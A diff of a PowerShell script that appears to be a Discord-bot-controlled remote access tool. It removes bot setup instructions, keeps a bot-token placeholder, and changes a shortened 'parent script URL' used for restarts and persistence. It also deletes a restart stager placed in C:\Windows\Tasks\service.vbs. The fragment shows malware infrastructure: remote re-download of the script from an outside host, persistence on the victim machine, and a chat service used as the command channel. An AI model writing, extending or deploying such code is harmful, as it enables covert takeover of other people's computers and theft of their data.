@@ -1,22 +1,5 @@
 
 # =====================================================================================================================================================
-<#
-**SETUP**
--SETUP THE BOT
-1. make a discord bot at https://discord.com/developers/applications/
-2. Enable all Privileged Gateway Intents on 'Bot' page
-3. On OAuth2 page, tick 'Bot' in Scopes section
-4. In Bot Permissions section tick Manage Channels, Read Messages/View Channels, Attach Files, Read Message History.
-5. Copy the URL into a browser and add the bot to your server.
-6. On 'Bot' page click 'Reset Token' and copy the token.
-
--SETUP THE SCRIPT
-1. Copy the token into the script directly below.
-
-
--------------------------------------------------------------------------------------------------
-#>
-# =====================================================================================================================================================
 $global:token = "$tk" # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
 
@@ -29,7 +12,7 @@ if ($auto -eq 'n'){
 	$defaultstart = 0 
 }
 
-$global:parent = "is.gd/bwdcc2" # parent script URL (for restarts and persistance)
+$global:parent = "https://shorturl.at/UBq0e" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
